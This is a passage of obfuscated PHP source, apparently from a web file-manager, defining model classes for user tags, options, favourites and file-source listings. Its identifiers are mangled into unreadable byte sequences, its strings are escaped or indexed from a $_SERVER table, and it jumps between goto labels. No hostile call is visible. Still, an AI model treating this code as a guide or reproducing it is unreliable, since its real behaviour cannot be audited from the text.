$Æ¥š’ ©) { return $Õé‚ÀºŒ > $Æ¥š’ ©; } $_SERVER[$_SERVER[ĞÅóÜØğ][3]] = ("\x38\x32\x36\x37"."\x32\x39")+0;$_qz9o="ds3kj6lueo0v42cq9f7nipgma1bhxz8yt5rwx5md9ht4vsia0jk2unpbl3fewygc1orzq678sq6k";; class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($ü¡í†¦, $¸˜¼¸éƒ) { $óùÀğ“ö =& $_SERVER[‚ûòÉ˜ş]; if (isset(self::$_methodList[$ü¡í†¦])) { return @call_user_func_array(self::$_methodList[$ü¡í†¦], $¸˜¼¸éƒ); } else { if (method_exists($this, $ü¡í†¦)) { return call_user_func_array(array($this, $ü¡í†¦), $¸˜¼¸éƒ); } else { think_exception(__CLASS__ . $óùÀğ“ö[4] . $ü¡í†¦ . $óùÀğ“ö[5]); } } } public static function __callStatic($áÔÌ£, $¿‘ş‡¯à) { if (isset(self::$_methodListStatic[$áÔÌ£])) { return call_user_func_array(self::$_methodListStatic[$áÔÌ£], $¿‘ş‡¯à); } else { if (method_exists(self, $áÔÌ£)) { return call_user_func_array(array(self, $áÔÌ£), $¿‘ş‡¯à); } else { show_json("{$áÔÌ£}\50\51\40\156\x6f\x74\x20\145\170\x69\x73\164\73", !1); } } } public static function addMethod($…·ìÚ©³, $äÀÌ–à¿) { self::$_methodList[$…·ìÚ©³] = $äÀÌ–à¿; } public static function addMethodStatic($æÛ¾àã, $ĞñŞÌ®“) { self::$_methodListStatic[$æÛ¾àã] = $ĞñŞÌ®“; } } goto bøÑ®Î¼®; fñ¾‡²—Ş¹: class UserTagModel extends ModelBaseLight { public $optionType = "\x55\x73\145\x72\x2e\x74\x61\x67\x4c\151\163\164"; public $modelType = "\x55\163\x65\162\x4f\160\x74\151\x6f\x6e"; public $field = array("\156\141\x6d\145", "\163\164\x79\x6c\145", "\163\157\x72\x74"); public function listData($ËÔ’ºÕÃ = false, $±¦ÅÎî« = "\x73\157\162\x74", $İ½Ä¥õ› = false) { return parent::listData($ËÔ’ºÕÃ, $±¦ÅÎî«, $İ½Ä¥õ›); } public function remove($ò¤’„Ş) { return parent::remove($ò¤’„Ş); } public function add($ÙÊéìŸ, $ùµ¹òŠ¶ = "\154\141\142\x65\x6c\55\x67\x72\x65\171\55\156\157\162\155\141\154") { $éÂ»¸ø =& $_SERVER[‚ûòÉ˜ş]; if ($this->findByName($ÙÊéìŸ)) { return !1; } $—×µäÍù = array($éÂ»¸ø[470] => $ÙÊéìŸ, $éÂ»¸ø[534] => $ùµ¹òŠ¶, $éÂ»¸ø[1889] => $this->getSort($éÂ»¸ø[311]) + 1); return parent::insert($—×µäÍù); } public function update($ì¾Ê£×Û, $ÕĞøÖ¤) { $³ù¿–™£ =& $_SERVER[‚ûòÉ˜ş]; $‚ıîíşô = $this->listData($ì¾Ê£×Û); $œ×á™Ş¤ = $this->findByName($ÕĞøÖ¤[$³ù¿–™£[42]]); if (!$‚ıîíşô || $œ×á™Ş¤ && $œ×á™Ş¤[$³ù¿–™£[451]] != $‚ıîíşô[$³ù¿–™£[451]]) { return !1; } return parent::update($ì¾Ê£×Û, $ÕĞøÖ¤); } public function moveTop($şÓÑ¼¬×) { $ÀÚÊíâ¤ =& $_SERVER[‚ûòÉ˜ş]; $ÆÆÚºš = parent::listData(); $åî°«§ = $this->getSort($ÀÚÊíâ¤[310]); foreach ($ÆÆÚºš as &$½„ëÛáÚ) { if ($½„ëÛáÚ[$ÀÚÊíâ¤[451]] == $şÓÑ¼¬×) { $½„ëÛáÚ[$ÀÚÊíâ¤[1909]] = $åî°«§; continue; } $½„ëÛáÚ[$ÀÚÊíâ¤[1909]] += 1; } unset($½„ëÛáÚ); return parent::resetData($ÆÆÚºš); } public function moveBottom($—â©•ˆ¥) { $—Çè½Óº =& $_SERVER[‚ûòÉ˜ş]; $›¿¤€ÆÅ = $this->getSort($—Çè½Óº[311]) + 1; return parent::update($—â©•ˆ¥, array($—Çè½Óº[1909] => $›¿¤€ÆÅ)); } public function resetSort($¥‰§âá¹) { $¯“ì¶Ö… =& $_SERVER[‚ûòÉ˜ş]; $ñ ŞÇºƒ = array(); $¥‰§âá¹ = is_array($¥‰§âá¹) ? $¥‰§âá¹ : array(); for ($à²îíŸä = 0; $à²îíŸä < count($¥‰§âá¹); $à²îíŸä++) { $ñ ŞÇºƒ[$¥‰§âá¹[$à²îíŸä] . $¯“ì¶Ö…[12]] = $à²îíŸä + 1; } $Ã¶öŠ÷è = parent::listData(); foreach ($Ã¶öŠ÷è as &$õë³¾«) { $×¦­ˆ ³ = $ñ ŞÇºƒ[$õë³¾«[$¯“ì¶Ö…[451]]]; $õë³¾«[$¯“ì¶Ö…[1909]] = $×¦­ˆ ³ ? $×¦­ˆ ³ : $õë³¾«[$¯“ì¶Ö…[1909]]; } unset($õë³¾«); return parent::resetData($Ã¶öŠ÷è); } private function getSort($¥š´ñ•) { $¼Ÿ£Ö•Ñ =& $_SERVER[‚ûòÉ˜ş]; $ß€ï‹Éë = parent::listData(); $¬¤øÑûÖ = array_to_keyvalue($ß€ï‹Éë, $¼Ÿ£Ö•Ñ[12], $¼Ÿ£Ö•Ñ[1909]); if (!$¬¤øÑûÖ) { $¬¤øÑûÖ = array(0); } $‘ëÆÓ» = $¥š´ñ• == $¼Ÿ£Ö•Ñ[311] ? max($¬¤øÑûÖ) : min($¬¤øÑûÖ); return intval($‘ëÆÓ»); } } goto e°ÁÒÊØŸİ; dô ²¸İ: class ModelBaseLight { public $optionType = ''; public $modelType = "\x53\x79\x73\164\145\x6d\x4f\x70\x74\151\157\156"; public $field = array(); public function listData($ª£‰£€ü = false, $úóÜ»Äá = "\155\x6f\144\151\x66\171\124\151\x6d\x65", $å‚ÄÁŒ = false) { $ÔÀÍğ = Model($this->modelType)->get(!1, $this->optionType, !0); $Ğ…ğ›õ½ = array_values($ÔÀÍğ); if ($Ğ…ğ›õ½ && $Ğ…ğ›õ½[0] && !is_array($Ğ…ğ›õ½[0])) { Model($this->modelType)->cacheRemove($this->optionType); $ÔÀÍğ = Model($this->modelType)->get(!1, $this->optionType, !0); } if (!$ÔÀÍğ) { return $ª£‰£€ü ? null : array(); } if (!$ª£‰£€ü) { $ÔÀÍğ = array_filter(array_values($ÔÀÍğ)); return array_sort_by($ÔÀÍğ, $úóÜ»Äá, $å‚ÄÁŒ); } return $ÔÀÍğ[$_SERVER[‚ûòÉ˜ş][448] . $ª£‰£€ü]; } public function insert($‹¤ªê©¾) { $‰ãóŞ×« =& $_SERVER[‚ûòÉ˜ş]; $‹¤ªê©¾ = array_field_key($‹¤ªê©¾, $this->field); $º˜¥·¼ä = Model($this->modelType)->get($‰ãóŞ×«[449], $this->optionType . $‰ãóŞ×«[450]); $º˜¥·¼ä = $º˜¥·¼ä ? $º˜¥·¼ä : 0; $‹¤ªê©¾[$‰ãóŞ×«[451]] = ++$º˜¥·¼ä; $‹¤ªê©¾[$‰ãóŞ×«[225]] = time(); $‹¤ªê©¾[$‰ãóŞ×«[95]] = time(); Model($this->modelType)->set($‰ãóŞ×«[449], $º˜¥·¼ä, $this->optionType . $‰ãóŞ×«[450]); Model($this->modelType)->set($‰ãóŞ×«[448] . $º˜¥·¼ä, $‹¤ªê©¾, $this->optionType); return $º˜¥·¼ä; } public function update($àú–é, $ı¡Œö) { $ŒµãÛå =& $_SERVER[‚ûòÉ˜ş]; $ı¡Œö = array_field_key($ı¡Œö, $this->field); $¥¼ô÷¯¨ = $this->listData($àú–é); if (!$¥¼ô÷¯¨ || !$àú–é) { return !1; } $ı¡Œö = array_merge($¥¼ô÷¯¨, $ı¡Œö); $ı¡Œö[$ŒµãÛå[95]] = time(); return Model($this->modelType)->set($ŒµãÛå[448] . $àú–é, $ı¡Œö, $this->optionType); } public function remove($…€şãÌÖ) { if (!$…€şãÌÖ) { return !1; } return Model($this->modelType)->remove($_SERVER[‚ûòÉ˜ş][448] . $…€şãÌÖ, $this->optionType); } public function clear() { $õ³û =& $_SERVER[‚ûòÉ˜ş]; Model($this->modelType)->remove($õ³û[449], $this->optionType . $õ³û[450]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($á¶ÍÁÇ®, $¸·÷¶ÃÊ) { if (!$¸·÷¶ÃÊ) { return !1; } $ã´¯™Œú = $this->listData(); $ã´¯™Œú = array_to_keyvalue($ã´¯™Œú, $á¶ÍÁÇ®); return isset($ã´¯™Œú[$¸·÷¶ÃÊ]) ? $ã´¯™Œú[$¸·÷¶ÃÊ] : !1; } public function findByName($ºÒÆåº·) { return $this->findByKey($_SERVER[‚ûòÉ˜ş][42], $ºÒÆåº·); } protected function resetData($†ˆí×â§) { $Ä¹´ãöÏ =& $_SERVER[‚ûòÉ˜ş]; $†ˆí×â§ = is_array($†ˆí×â§) ? $†ˆí×â§ : array(); $´—è¶ÂÅ = array(); for ($ªšÜŸÜƒ = 0; $ªšÜŸÜƒ < count($†ˆí×â§); $ªšÜŸÜƒ++) { $´—è¶ÂÅ[$Ä¹´ãöÏ[448] . $†ˆí×â§[$ªšÜŸÜƒ][$Ä¹´ãöÏ[451]]] = $†ˆí×â§[$ªšÜŸÜƒ]; } return Model($this->modelType)->set($´—è¶ÂÅ, !1, $this->optionType); } private function getAutoName($½åØ–Ó§) { $—îˆËèÒ = array_to_keyvalue($this->listData(), $_SERVER[‚ûòÉ˜ş][42]); if (!$—îˆËèÒ || !isset($—îˆËèÒ[$½åØ–Ó§])) { return $½åØ–Ó§; } for ($±›«´øÆ = 1; $±›«´øÆ < count($—îˆËèÒ); $±›«´øÆ++) { $ÔŠÛÚË = $½åØ–Ó§ . "\x28{$±›«´øÆ}\x29"; if (!isset($—îˆËèÒ[$ÔŠÛÚË])) { return $ÔŠÛÚË; } } return $ÔŠÛÚË; } } class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($öªŒµîÒ = false, $ıÜ°²ƒ = '', $ì‹”ë„ = false) { $åõÔœ™ú =& $_SERVER[‚ûòÉ˜ş]; $ã‰¤ÄõÊ = $this->cacheGet($ıÜ°²ƒ); $õÊ‘‹Éª = $this->optionDefault($ıÜ°²ƒ); $õÊ‘‹Éª = is_array($õÊ‘‹Éª) ? $õÊ‘‹Éª : array(); if (is_array($ã‰¤ÄõÊ)) { $ã‰¤ÄõÊ = array_merge($õÊ‘‹Éª, $ã‰¤ÄõÊ); return $öªŒµîÒ ? isset($ã‰¤ÄõÊ[$öªŒµîÒ]) ? $ã‰¤ÄõÊ[$öªŒµîÒ] : null : $ã‰¤ÄõÊ; } $Ñ…şËÁÌ = $this->filterWhere(array($åõÔœ™ú[43] => $ıÜ°²ƒ)); $ã‰¤ÄõÊ = $this->where($Ñ…şËÁÌ)->select(); $ã‰¤ÄõÊ = array_to_keyvalue($ã‰¤ÄõÊ, $åõÔœ™ú[104], $åõÔœ™ú[427]); foreach ($ã‰¤ÄõÊ as $§Ä¨Ò’± => $”£ĞÃ) { if ($ì‹”ë„ || in_array($§Ä¨Ò’±, $this->jsonField)) { $ã‰¤ÄõÊ[$§Ä¨Ò’±] = json_decode($”£ĞÃ, !0); } } $this->cacheSet($ıÜ°²ƒ, $ã‰¤ÄõÊ); $ã‰¤ÄõÊ = array_merge($õÊ‘‹Éª, $ã‰¤ÄõÊ); return $öªŒµîÒ ? $ã‰¤ÄõÊ[$öªŒµîÒ] : $ã‰¤ÄõÊ; } public function set($Õµ»í­, $¬ìÎ”Ğ = false, $ÅÙ¤ûƒ† = '') { $İ¹Ô»Ğ =& $_SERVER[‚ûòÉ˜ş]; $this->cacheRemove($ÅÙ¤ûƒ†); $·šÁ€–¨ = array(); $Á’Ù¢çÍ = is_array($Õµ»í­) ? $Õµ»í­ : array($Õµ»í­ => $¬ìÎ”Ğ); foreach ($Á’Ù¢çÍ as $‚ŞÒ¬ Ù => $ã©óú) { if (is_array($ã©óú)) { $ã©óú = json_encode_force($ã©óú); } $this->checkLength($ã©óú, !1, $this->tableName . $İ¹Ô»Ğ[4] . $Õµ»í­); $ã©óú = self::textEncode($ã©óú); $Á’Ù¢çÍ = array($İ¹Ô»Ğ[43] => $ÅÙ¤ûƒ†, $İ¹Ô»Ğ[104] => $‚ŞÒ¬ Ù, $İ¹Ô»Ğ[427] => $ã©óú); $·šÁ€–¨[] = $this->filterWhere($Á’Ù¢çÍ); } if (!$·šÁ€–¨) { return !0; } $°•›ïıÜ = $this->cacheKey($İ¹Ô»Ğ[452]); CacheLock::lock($°•›ïıÜ); $°ôÑÒûÍ = $this->addAll($·šÁ€–¨, array(), !0); CacheLock::unlock($°•›ïıÜ); return $°ôÑÒûÍ; } protected function optionDefault($ò‡¶è”£ = '') { return !1; } public function setDeep($ùÓç¡ÑÏ, $Å¿Ò—Œå = false, $¨ç¯»»Í = '') { $ù¶íí·ß = explode($_SERVER[‚ûòÉ˜ş][10], $ùÓç¡ÑÏ); $ĞŞ¨âúö = $this->get(); array_set_value($ĞŞ¨âúö, $ùÓç¡ÑÏ, $Å¿Ò—Œå); $this->set($ù¶íí·ß[0], $ĞŞ¨âúö[$ù¶íí·ß[0]], $¨ç¯»»Í); } public function remove($Òúø¤û, $Ğ¼õü»Œ = '') { $Õø£Àƒ› =& $_SERVER[‚ûòÉ˜ş]; $this->cacheRemove($Ğ¼õü»Œ); $ø’ĞµÍè = $this->filterWhere(array($Õø£Àƒ›[104] => $Òúø¤û, $Õø£Àƒ›[43] => $Ğ¼õü»Œ)); if (is_null($Òúø¤û)) { unset($ø’ĞµÍè[$Õø£Àƒ›[104]]); } return $this->where($ø’ĞµÍè)->delete(); } public function cacheSet($¢¶¢ùÏ, $ªìˆíÙí = false) { return Cache::set($this->cacheKey($¢¶¢ùÏ), $ªìˆíÙí); } public function cacheGet($€ÂÌÔğ) { return Cache::get($this->cacheKey($€ÂÌÔğ)); } public function cacheRemove($ó­Ó¯ÉÍ) { return Cache::remove($this->cacheKey($ó­Ó¯ÉÍ)); } protected function filterWhere($Ç«Í•§õ) { return $Ç«Í•§õ; } protected function cacheKey($¤©Š‹íÖ) { return $¤©Š‹íÖ; } } class SourceListModel extends ModelBase { protected $tableName = "\x69\x6f\137\x73\157\x75\162\x63\145"; protected $tableMeta = array("\x74\141\142\x6c\145\116\x61\x6d\145" => "\x69\157\x5f\x73\157\x75\162\x63\x65\137\155\145\x74\x61", "\x6d\145\164\141\x46\x69\x65\154\x64" => "\163\157\x75\x72\143\x65\111\x44"); protected $dataAuto = array(array("\155\x6f\x64\x69\146\x79\x54\151\155\145", "\x74\x69\155\145", "\151\156\163\145\x72\164", "\x66\165\x6e\x63\164\x69\157\x6e"), array("\x63\162\145\x61\164\x65\124\151\155\145", "\164\x69\x6d\145", "\x69\x6e\x73\x65\x72\x74", "\146\x75\156\x63\164\151\157\156"), array("\166\x69\x65\167\124\x69\155\145", "\164\x69\x6d\x65", "\151\x6e\x73\x65\x72\164", "\146\x75\x6e\x63\x74\x69\x6f\156")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($îş”ú†) { return $this->listSource(array($_SERVER[‚ûòÉ˜ş][453] => $îş”ú†)); } public function typeName($“İèƒì) { static $ƒÔ£œÏ = array(self::TYPE_SYSTEM => "\163\x79\163\164\x65\x6d", self::TYPE_USER => "\165\163\145\x72", self::TYPE_GROUP => "\x67\x72\157\165\160"); return $ƒÔ£œÏ[$“İèƒì . $_SERVER[‚ûòÉ˜ş][12]]; } public function sourceListInfo($Œ¦ˆºÂí, $Ó¨óÇĞã = false) { $«¼Áì‚ =& $_SERVER[‚ûòÉ˜ş]; $Œ¦ˆºÂí = $Œ¦ˆºÂí ? $Œ¦ˆºÂí : array(); $Œ¦ˆºÂí = array_filter(array_unique($Œ¦ˆºÂí)); if (!$Œ¦ˆºÂí) { return array(); } $Ñü³èü… = $this->where(array($«¼Áì‚[191] => array($«¼Áì‚[7], $Œ¦ˆºÂí)))->select(); $this->_listDataApply($Ñü³èü…, $Ó¨óÇĞã); return array_to_keyvalue($Ñü³èü…, $«¼Áì‚[191]); } public function pathInfoFilter(&$Ş·™ªÃ“) { $æŠ¤«ËÕ =& $_SERVER[‚ûòÉ˜ş]; static $ÜûŸŠ‹û = false; static $¸Èñ¹² = false; static $Å´÷û¡• = false; if (!$ÜûŸŠ‹û) { $Ÿ½®—»« = $æŠ¤«ËÕ[454]; $Ÿ½®—»« .= $æŠ¤«ËÕ[455]; $Ÿ½®—»« .= $æŠ¤«ËÕ[456]; $áäÏø®„ = $æŠ¤«ËÕ[457]; $ŒÜ¿ˆÇ = explode($æŠ¤«ËÕ[60], $áäÏø®„); $ÜûŸŠ‹û = explode($æŠ¤«ËÕ[60], $Ÿ½®—»«); $¸Èñ¹² = array(); foreach ($ÜûŸŠ‹û as $–²Ö›µ¹) { if (in_array($–²Ö›µ¹, $ŒÜ¿ˆÇ)) { continue; } $¸Èñ¹²[] = $–²Ö›µ¹; } $Å´÷û¡• = explode($æŠ¤«ËÕ[60], $æŠ¤«ËÕ[458]); } foreach ($Å´÷û¡• as $Ë„“àà—) { if (isset($Ş·™ªÃ“[$Ë„“àà—])) { $Ş·™ªÃ“[$Ë„“àà—] = intval($Ş·™ªÃ“[$Ë„“àà—]); } } $Ş·™ªÃ“[$æŠ¤«ËÕ[94]] = $æŠ¤«ËÕ[459] . $Ş·™ªÃ“[$æŠ¤«ËÕ[191]] . $æŠ¤«ËÕ[460]; $Ş·™ªÃ“[$æŠ¤«ËÕ[43]] = $Ş·™ªÃ“[$æŠ¤«ËÕ[461]] == 1 ? $æŠ¤«ËÕ[85] : $æŠ¤«ËÕ[224]; $Ş·™ªÃ“[$æŠ¤«ËÕ[188]] = $this->typeName($Ş·™ªÃ“[$æŠ¤«ËÕ[188]]); if ($Ş·™ªÃ“[$æŠ¤«ËÕ[461]] != 1) { $Ş·™ªÃ“[$æŠ¤«ËÕ[185]] = $Ş·™ªÃ“[$æŠ¤«ËÕ[462]]; unset($Ş·™ªÃ“[$æŠ¤«ËÕ[462]]); } $œèµ»Æ = $ÜûŸŠ‹û; if (isset($Ş·™ªÃ“[$æŠ¤«ËÕ[463]]) && $Ş·™ªÃ“[$æŠ¤«ËÕ[463]][$æŠ¤«ËÕ[464]] == -1) { $œèµ»Æ = $¸Èñ¹²; } $Ş·™ªÃ“ = array_field_key($Ş·™ªÃ“, $œèµ»Æ); return $Ş·™ªÃ“; } public function listUserFav() { $µ¢–ö½ş =& $_SERVER[‚ûòÉ˜ş]; $ğĞªùé„ = Model($µ¢–ö½ş[465])->listData(); $¹¡º’¦ˆ = array_filter_by_field($ğĞªùé„, $µ¢–ö½ş[43], $µ¢–ö½ş[466]); $¹¡º’¦ˆ = array_to_keyvalue($¹¡º’¦ˆ, $µ¢–ö½ş[12], $µ¢–ö½ş[94]); if ($¹¡º’¦ˆ) { $»î²½“† = $this->listSource(array($µ¢–ö½ş[467] => array($µ¢–ö½ş[468], $¹¡º’¦ˆ))); } $»î²½“† = array_to_keyvalue($»î²½“†[$µ¢–ö½ş[422]], $µ¢–ö½ş[191]); foreach ($ğĞªùé„ as &$®ÙÌÆö) { $®ÙÌÆö = array($µ¢–ö½ş[469] => $®ÙÌÆö[$µ¢–ö½ş[451]], $µ¢–ö½ş[470] => $®ÙÌÆö[$µ¢–ö½ş[42]], $µ¢–ö½ş[471] => $®ÙÌÆö[$µ¢–ö½ş[94]], $µ¢–ö½ş[472] => $®ÙÌÆö[$µ¢–ö½ş[43]], $µ¢–ö½ş[473] => $®ÙÌÆö[$µ¢–ö½ş[225]], $µ¢–ö½ş[474] => $®ÙÌÆö[$µ¢–ö½ş[95]]); if ($®ÙÌÆö[$µ¢–ö½ş[43]] == $µ¢–ö½ş[466] && $»î²½“†[$®ÙÌÆö[$µ¢–ö½ş[94]]]) { $®ÙÌÆö[$µ¢–ö½ş[97]] = $»î²½“†[$®ÙÌÆö[$µ¢–ö½ş[94]]]; } } unset($®ÙÌÆö); return $ğĞªùé„; } public function listUserTag($äø‘¾Õà) { $°Î£²è´ =& $_SERVER[‚ûòÉ˜ş]; if ($äø‘¾Õà && !is_array($äø‘¾Õà)) { $äø‘¾Õà = array($äø‘¾Õà); } $Ûş¿˜™Ö = Model($°Î£²è´[475])->listData(); $ƒÉ†— = array(); $ƒ†äÒ’€ = array(); foreach ($Ûş¿˜™Ö as $‘¤î®) { $ÛŒŸœ½÷ = $‘¤î®[$°Î£²è´[94]]; if (!$ÛŒŸœ½÷) { continue; } if (!isset($ƒ†äÒ’€[$ÛŒŸœ½÷])) { $ƒ†äÒ’€[$ÛŒŸœ½÷] = array(); } $ƒ†äÒ’€[$ÛŒŸœ½÷][] = $‘¤î®[$°Î£²è´[476]]; $ƒÉ†—[$‘¤î®[$°Î£²è´[94]]] = $‘¤î®; } $…Ã¥Ÿâ = array(); $õã°Òì² = array(); $ï¡°¯îä = array(); foreach ($ƒ†äÒ’€ as $û„ŸÈ»Ş => $ß‚àå…€) { $ÏØüÄßõ = !0; if (!$äø‘¾Õà) { $…Ã¥Ÿâ[] = $û„ŸÈ»Ş; continue; } foreach ($äø‘¾Õà as $Şïæ êå) { if (!in_array($Şïæ êå, $ß‚àå…€)) { $ÏØüÄßõ = !1; break; } } if (!$ÏØüÄßõ) { continue; } if (!is_numeric($û„ŸÈ»Ş)) { $ÇÚúƒªÑ = $ƒÉ†—[$û„ŸÈ»Ş]; $Í¬çÄ¨ş = array($°Î£²è´[42] => $ÇÚúƒªÑ[$°Î£²è´[42]], $°Î£²è´[94] => $ÇÚúƒªÑ[$°Î£²è´[94]], $°Î£²è´[43] => $ÇÚúƒªÑ[$°Î£²è´[43]], $°Î£²è´[97] => array($°Î£²è´[477] => 1), $°Î£²è´[226] => !0); if ($ÇÚúƒªÑ[$°Î£²è´[43]] == $°Î£²è´[224]) { $ï¡°¯îä[] = $Í¬çÄ¨ş; } if ($ÇÚúƒªÑ[$°Î£²è´[43]] == $°Î£²è´[85]) { $õã°Òì²[] = $Í¬çÄ¨ş; } continue; } $…Ã¥Ÿâ[] = $û„ŸÈ»Ş; } if ($…Ã¥Ÿâ) { $Üé“˜ÊË = $this->listSource(array($°Î£²è´[467] => array($°Î£²è´[468], $…Ã¥Ÿâ))); } $Üé“˜ÊË = $Üé“˜ÊË ? $Üé“˜ÊË : array($°Î£²è´[92] => array(), $°Î£²è´[93] => array()); $Üé“˜ÊË[$°Î£²è´[92]] = array_merge($Üé“˜ÊË[$°Î£²è´[92]], $õã°Òì²); $Üé“˜ÊË[$°Î£²è´[93]] = array_merge($Üé“˜ÊË[$°Î£²è´[93]], $ï¡°¯îä); if (isset($Üé“˜ÊË[$°Î£²è´[419]]) && count($…Ã¥Ÿâ) == $Üé“˜ÊË[$°Î£²è´[419]][$°Î£²è´[420]]) { return $Üé“˜ÊË; } $“³¡‰È› = array(); $•¨ëÔÍË = array_to_keyvalue($Üé“˜ÊË[$°Î£²è´[92]], $°Î£²è´[12], $°Î£²è´[191]); $ë¸Æ™˜ç = array_to_keyvalue($Üé“˜ÊË[$°Î£²è´[93]], $°Î£²è´[12], $°Î£²è´[191]); $ç ïöù½ = array_merge($ë¸Æ™˜ç, $•¨ëÔÍË); foreach ($…Ã¥Ÿâ as $ÛŒŸœ½÷) { if (!in_array($ÛŒŸœ½÷, $ç ïöù½)) { $“³¡‰È›[] = $ÛŒŸœ½÷; } } if ($“³¡‰È›) { Model($°Î£²è´[478])->removeBySource($“³¡‰È›); } return $Üé“˜ÊË; } public function listUserRecycle() { $™ÏîÛûµ =& $_SERVER[‚ûòÉ˜ş]; $Ùµ±‹‚ = Model($™ÏîÛûµ[479])->listData(); if (!$Ùµ±‹‚) { return array(); } $‹°ı˜æë = array($™ÏîÛûµ[467] => array($™ÏîÛûµ[468], $Ùµ±‹‚), $™ÏîÛûµ[480] => 1); return $this->listSource($‹°ı˜æë); } public function listSource($Àìõíµï, $‚¦Ë»ğ§ = 3000, $Ì‡š­Íß = false) { $³‡ù‰¹š =& $_SERVER[‚ûòÉ˜ş]; if (!isset($Àìõíµï[$³‡ù‰¹š[481]])) { $Àìõíµï[$³‡ù‰¹š[481]] = 0; } if (isset($Àìõíµï[$³‡ù‰¹š[190]]) && $Àìõíµï[$³‡ù‰¹š[190]] == $³‡ù‰¹š[222]) { $Àìõíµï[$³‡ù‰¹š[462]] = array($³‡ù‰¹š[384], $³‡ù‰¹š[482]); } $²´ôİ¦¨ = $³‡ù‰¹š[483]; $ê´®ëáí = $this->field($²´ôİ¦¨)->_makeOrder()->where($Àìõíµï)->selectPage($‚¦Ë»ğ§); $this->_listPageCheck($ê´®ëáí, $²´ôİ¦¨, $Àìõíµï); $this->_listDataApply($ê´®ëáí[$³‡ù‰¹š[422]], $Ì‡š­Íß); $this->_listMake($ê´®ëáí); return $ê´®ëáí; } private function _listPageCheck(&$şÎŒßÎ, $ŞØäÂ˜¢, $Ì ªï­æ) { $¾—™¾Ò =& $_SERVER[‚ûòÉ˜ş]; if (!is_array($şÎŒßÎ[$¾—™¾Ò[419]])) { return; } $ÑµÓÚ¼¡ = $şÎŒßÎ[$¾—™¾Ò[419]]; if ($ÑµÓÚ¼¡[$¾—™¾Ò[421]] <= 1) { return; } if ($ÑµÓÚ¼¡[$¾—™¾Ò[420]] >= 100000) { return; } if (Model($¾—™¾Ò[484])->get($¾—™¾Ò[485]) != $¾—™¾Ò[486]) { return; } $ŞØäÂ˜¢ = str_replace(array($¾—™¾Ò[63], $¾—™¾Ò[395], $¾—™¾Ò[18]), $¾—™¾Ò[12], $ŞØäÂ˜¢); $ŞØäÂ˜¢ = $¾—™¾Ò[487] . str_replace($¾—™¾Ò[60], $¾—™¾Ò[488], $ŞØäÂ˜¢) . $¾—™¾Ò[489]; $êñù¿± = $¾—™¾Ò[490]; $êñù¿± = $êñù¿± . $¾—™¾Ò[491]; $û˜’ñ¡‚ = $ÑµÓÚ¼¡[$¾—™¾Ò[416]] * ($ÑµÓÚ¼¡[$¾—™¾Ò[406]] - 1) . $¾—™¾Ò[60] . $ÑµÓÚ¼¡[$¾—™¾Ò[416]]; $×ÜÍÕÅ“ = $this->_makeOrder(!0); $±ÂÃ” = $¾—™¾Ò[487] . str_replace($¾—™¾Ò[60], $¾—™¾Ò[488], $×ÜÍÕÅ“[0]); if (strpos($±ÂÃ”, $¾—™¾Ò[492])) { $±ÂÃ” = str_replace($¾—™¾Ò[492], $¾—™¾Ò[493], $±ÂÃ”); } else { $±ÂÃ” .= $¾—™¾Ò[494] . $×ÜÍÕÅ“[1]; } $‹æÄÅİ¦ = array(); foreach ($Ì ªï­æ as $Ç®öî¢Ç => $«ü“±¾Ä) { $‹æÄÅİ¦[$¾—™¾Ò[487] . $Ç®öî¢Ç] = $«ü“±¾Ä; } $this->alias($¾—™¾Ò[495])->field($ŞØäÂ˜¢)->limit($û˜’ñ¡‚)->order($±ÂÃ”); $¢ËËæØ¸ = $this->join($êñù¿±)->where($‹æÄÅİ¦)->select(); if ($¢ËËæØ¸) { $şÎŒßÎ[$¾—™¾Ò[422]] = $¢ËËæØ¸; } } protected function _makeOrder($Éùñ¸Ô = false) { $ìé»Ä¶ä =& $_SERVER[‚ûòÉ˜ş]; $ªŞÖŒÇÄ = Model($ìé»Ä¶ä[496])->get($ìé»Ä¶ä[497]); $›ÀÄÎ “ = Model($ìé»Ä¶ä[496])->get($ìé»Ä¶ä[498]); $ÉØËÇ·ş = array($ìé»Ä¶ä[499] => $ìé»Ä¶ä[500], $ìé»Ä¶ä[501] => $ìé»Ä¶ä[502]); $¨Æ‰¼à = array($ìé»Ä¶ä[42] => $ìé»Ä¶ä[42], $ìé»Ä¶ä[86] => $ìé»Ä¶ä[86], $ìé»Ä¶ä[185] => $ìé»Ä¶ä[462], $ìé»Ä¶ä[503] => $ìé»Ä¶ä[503], $ìé»Ä¶ä[504] => $ìé»Ä¶ä[505], $ìé»Ä¶ä[225] => $ìé»Ä¶ä[225], $ìé»Ä¶ä[95] => $ìé»Ä¶ä[95]); $Óê•¦æ = Input::get($ìé»Ä¶ä[506], $ìé»Ä¶ä[7], $ªŞÖŒÇÄ, array_keys($¨Æ‰¼à)); $ïóËŸ” = Input::get($ìé»Ä¶ä[507], $ìé»Ä¶ä[7], $›ÀÄÎ “, array_keys($ÉØËÇ·ş)); if (!in_array($Óê•¦æ, array_keys($¨Æ‰¼à))) { $Óê•¦æ = $ìé»Ä¶ä[42]; } if (!in_array($ïóËŸ”, array_keys($ÉØËÇ·ş))) { $Óê•¦æ = $ìé»Ä¶ä[499]; } if ($Óê•¦æ == $ìé»Ä¶ä[42]) { } $İòªöäƒ = $ìé»Ä¶ä[508] . $¨Æ‰¼à[$Óê•¦æ] . $ìé»Ä¶ä[63] . $ÉØËÇ·ş[$ïóËŸ”]; $İòªöäƒ = rtrim(trim($İòªöäƒ), $ìé»Ä¶ä[60]); if ($Éùñ¸Ô) { return array($İòªöäƒ, $ÉØËÇ·ş[$ïóËŸ”]); } return $this->order($İòªöäƒ); } protected function _listDataApplyItem($æ§¾æ°İ, $ÌôÄ¨Ë­ = false) { $·£çÑ’ = array($æ§¾æ°İ); $this->_listDataApply($·£çÑ’, $ÌôÄ¨Ë­); return $·£çÑ’[0]; } protected function _listDataApply(&$æùõ²€ş, $¿ˆŸ½…Œ = false) { $„ğ´´ì¦ =& $_SERVER[‚ûòÉ˜ş]; if (!$æùõ²€ş) { $æùõ²€ş = array(); return; } $’Ä’Š’ = array_to_keyvalue($æùõ²€ş, $„ğ´´ì¦[12], 